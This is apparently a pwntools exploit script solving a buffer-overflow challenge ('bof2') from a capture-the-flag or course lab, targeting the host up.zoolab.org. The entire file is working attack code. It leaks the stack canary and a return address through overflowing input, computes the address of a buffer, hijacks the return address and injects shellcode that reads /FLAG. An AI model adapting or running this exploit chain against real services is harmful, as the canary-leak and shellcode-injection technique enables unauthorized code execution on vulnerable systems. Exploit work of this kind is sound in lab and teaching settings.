from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof2'
port = 12343

elf = ELF(exe)
off_main = elf.symbols[b'main']
ret = 0
qemu_ret = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_ret = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)


sc = shellcraft.open("/FLAG", 0)
sc += shellcraft.read('rax', 'rsp', 100)
sc += shellcraft.write(1, 'rsp', 100)
sc += shellcraft.exit(0)

shellcode = asm(sc)
# print(shellcode)

# overflow buf1 to get canary
payload1 = b'A' * 137
r.sendafter(b'name? ', payload1)
r.recvuntil(b'Welcome, ' + payload1)

leak = b'\x00'
leak += r.recvn(7)

canary = int.from_bytes(leak, byteorder='little')
canary_byte = canary.to_bytes(8, byteorder='little')
print("Canary address: ", hex(canary))

# overflow buf2 to get return address
payload2 = b'B' * 104
r.sendafter(b"number? ", payload2)

r.recvuntil(b'The room number is: '+ payload2)

leak = r.recvn(6)
leak += b'\x00\x00'

ret = int.from_bytes(leak, byteorder='little')
ret_byte = ret.to_bytes(8, byteorder='little')
print("Return address: ", hex(ret))

# msg - return address
offset = 0x7ca865755220 - 0x7ca86566fcbc
addr = ret + offset
addr_btye = addr.to_bytes(8, byteorder='little')
r.sendafter(b'name? ', b'C' * 40 + canary_byte + b'1' * 8 + addr_btye)

r.sendafter(b'message: ', shellcode)

r.readuntil(b'you!\n')
print(r.readuntil(b'}'))

# r.interactive()
r.close()
